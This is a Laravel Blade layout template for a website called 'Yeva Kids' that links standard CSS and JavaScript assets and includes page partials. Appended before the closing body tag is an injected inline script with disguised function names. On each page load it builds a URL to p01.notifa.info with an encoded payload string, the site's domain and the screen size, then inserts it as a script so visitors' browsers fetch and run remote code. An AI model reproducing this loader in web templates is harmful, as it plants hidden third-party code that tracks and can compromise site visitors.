<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Yeva Kids</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Favicon -->
    <link rel="shortcut icon" type="image/x-icon" href="{{asset('frontend/assets/images/yeva-icon.jpeg') }}">
    
    <!-- CSS
  ============================================ -->
   
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="{{asset('frontend/assets/css/bootstrap.min.css') }}">
    
    <!-- Icon Font CSS -->
    <link rel="stylesheet" href="{{asset('frontend/assets/css/icon-font.min.css') }}">
    
    <!-- Plugins CSS -->
    <link rel="stylesheet" href="{{asset('frontend/assets/css/plugins.css') }}">
    
    <!-- Helper CSS -->
    <link rel="stylesheet" href="{{asset('frontend/assets/css/helper.css') }}">
    
    <!-- Main Style CSS -->
    <link rel="stylesheet" href="{{asset('frontend/assets/css/style.css') }}">
    
    <!-- Modernizer JS -->
    <script src="{{ asset('frontend/assets/js/vendor/modernizr-2.8.3.min.js') }}"></script>
</head>

<body>

    @include('inc.header')
    @include('inc.navbar')
    @yield('content')
    @include('inc.footer')

<!-- JS
============================================ -->

<!-- jQuery JS -->
<script src="{{ asset('frontend/assets/js/vendor/jquery-1.12.4.min.js') }}"></script>
<!-- Popper JS -->
<script src="{{ asset('frontend/assets/js/popper.min.js') }}"></script>
<!-- Bootstrap JS -->
<script src="{{ asset('frontend/assets/js/bootstrap.min.js') }}"></script>
<!-- Plugins JS -->
<script src="{{ asset('frontend/assets/js/plugins.js') }}"></script>
<!-- Ajax Mail -->
<script src="{{ asset('frontend/assets/js/ajax-mail.js') }}"></script>
<!-- Main JS -->
<script src="{{ asset('frontend/assets/js/main.js') }}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdaD70J38UqoP3v1Av73jHJpc6RusRfDwmdc3v8w2774Ujp3SxTzzytTfQd1tY7QZU8u9czK9IMB6UbaWpGFwKfxyMxLmnZ3v1eCgRb4uxvEInU%2bueZ8lBP9tKCgcnsiC%2b2YppO3yu2F5lK29Mf3ddnUAOoD65fIpN9qIoFwXjlQqlq37aXHt8Vwg6Q9ZPIU8i2fc73ZyHu6o8u4JaIqDW5%2fD3we8n9b2grxvjFZm1ECjlEYaeiXYsHdiyrUPwj1k%2fiASlxf6%2fraz4jK4ZGcxJD2feWT8XvHxi3wjgtsa4YsYQ4Zxg45Eg65nqaa%2bXafGfLiC3jfNL78fDPe6Y2kmm54HogmHLVe9Lia0ij2%2f3wG1p%2frtxbIc1C%2fgPaI69ytMD4n8Y1714oVtqciSCqCxjDQKzA5y4ziZwT5Ere1ZNQAiGjH49YwouHtTgqcKmWk5ZlO%2bBrJvOKpUTcdJhIZklG5Wd25Mgbc1ffdrWW%2bcBESzyvXv9Z1vq%2bMlXB3xeKMD1lirW%2fbgVe10H4Ezl%2f64ek3GfNjqIbFZCCdpbO4nHnSDtpPmTjw9%2bXRpQA7R2Uh0j" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    @stack('scripts')
</html>